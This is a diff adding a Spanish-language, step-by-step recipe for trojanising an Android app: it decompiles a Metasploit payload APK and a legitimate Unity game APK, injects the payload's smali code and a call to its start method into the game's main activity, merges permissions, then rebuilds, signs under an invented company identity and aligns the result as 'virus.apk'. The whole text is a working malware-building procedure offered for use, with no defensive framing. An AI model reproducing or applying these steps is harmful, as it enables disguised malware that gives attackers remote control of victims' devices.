@@ -1,0 +1,109 @@
+# DESCARGAR APKTOOL PARA LINUX DESDE GITHUB
+
+https://github.com/iBotPeaches/Apktool/releases/tag/v2.5.0
+
+# INSTALAR (zipalign) UTILIZANDO EL GESTOR DE PAQUETES APT
+
+apt-get install zipalign -y
+
+# DESCOMPRIMIR EL PAYLOAD (METASPLOIT) Y LA APK LEGÍTIMA
+
+java -jar apktool_2.5.0.jar d msf.apk
+
+java -jar apktool_2.5.0.jar d balls.apk
+
+# COMPRIMIR TODO EL CONTENIDO DE LA CARPETA SMALI DEL PAYLOAD (METASPLOIT) Y DESCOMPRIMIR DENTRO DEL SMALI DE LA APK LEGÍTIMA
+
+tar -cf - ./smali | ( cd ../balls; tar -xpf - )
+
+# FILTRAR E IDENTIFICAR LA ACTIVIDAD PRINCIPAL DE LA APK LEGÍTIMA
+
+grep "MAIN" AndroidManifest.xml
+
+grep "MAIN" AndroidManifest.xml -B 2
+
+ACTIVIDAD PRINCIPAL IDENTIFICADA => (com.unity3d.player.UnityPlayerActivity)
+
+# CONVERTIR LOS PUNTOS DE LA ACTIVIDAD PRINCIPAL IDENTIFICADA A BARRAS
+
+echo "com.unity3d.player" | tr '.' '/'
+
+# INGRESAR AL DIRECTORIO DONDE SE ENCUENTRA EL ARCHIVO DE LA ACTIVIDAD PRINCIPAL DE LA APK LEGITIMA Y ABRIRLO
+
+nano UnityPlayerActivity.smali
+
+# FILTRAR LA SIGUIENTE LÍNEA DE CÓDIGO CON LA COMBINACIÓN DE TECLAS (ctrl + w)
+
+onCreate(
+
+LÍNEA DE CÓDIGO FILTRADA => onCreate(Landroid/os/Bundle;)V
+
+# UBICARNOS AL FINAL DE LA LÍNEA DE CÓDIGO FILTRADA, PULSAR ENTER, DAR 4 ESPACIOS Y ESCRIBIR LO SIGUIENTE
+
+invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
+
+# FILTRAR LOS PERMISOS DE LA APK LEGÍTIMA Y DEL PAYLOAD
+
+cat AndroidManifest.xml | grep "uses-permission"
+
+# GUARDAR TODOS LOS PERMISOS FILTRADOS DENTRO DE UN ARCHIVO
+
+NOMBRE DE MI ARCHIVO DE PERMISOS => (permisos.txt)
+
+# CONTAR EL NÚMERO DE LÍNEAS DEL ARCHIVO DE PERMISOS
+
+cat permisos.txt | wc -l
+
+# CONTAR EL NÚMERO DE LÍNEAS DEL ARCHIVO DE PERMISOS OMITIENDO LAS LÍNEAS REPETIDAS
+
+cat permisos.txt | sort -u | wc -l
+
+# MOSTRAR TODAS LAS LÍNEAS DEL ARCHIVO DE PERMISOS OMITIENDO LAS LÍNEAS REPETIDAS Y COPIARLAS
+
+cat permisos.txt | sort -u
+
+# EDITAR EL ARCHIVO (AndroidManifest.xml) DE LA APK LEGÍTIMA, BORRAR TODOS SUS PERMISOS Y PEGAR LOS PERMISOS COPIADOS
+
+nano AndroidManifest.xml
+
+# COMPILAR EL DIRECTORIO DE LA APK LEGÍTIMA CAMBIANDO SU NOMBRE
+
+java -jar apktool_2.5.0.jar b balls -o infect-balls.apk
+
+# FIRMAR LOS RECURSOS O FICHEROS DE LA APK LEGÍTIMA INFECTADA
+
+keytool -genkey -v -keystore balls.keystore -alias balls -keyalg RSA -keysize 2048 -validity 10000
+
+# INGRESAR Y CONFIRMAR UNA CONTRASEÑA PARA EL KEYSTORE
+
+prueba.123
+
+prueba.123
+
+# INGRESAR LOS DATOS SOLICITADOS CON INFORMACIÓN DE LA APLICACIÓN
+
+NOMBRE: Minerale Ltd
+
+UNIDAD ORGANIZACIÓN: Minerale Ltd
+
+ORGANIZACIÓN: Minerale Ltd
+
+CIUDAD: Ibarra
+
+PROVINCIA: Imbabura
+
+CÓDIGO PAÍS: EC
+
+ES CORRECTO?: si
+
+# AÑADIR LA KEYSTORE A LA APK LEGÍTIMA INFECTADA
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore balls.keystore infect-balls.apk balls
+
+# INGRESAR LA CONTRASEÑA DEL KEYSTORE Y PULSAR ENTER
+
+prueba.123
+
+# ACELERAR EL PROCESADOR REDUCIENDO EN BYTES
+
+zipalign -v 4 infect-balls.apk virus.apk
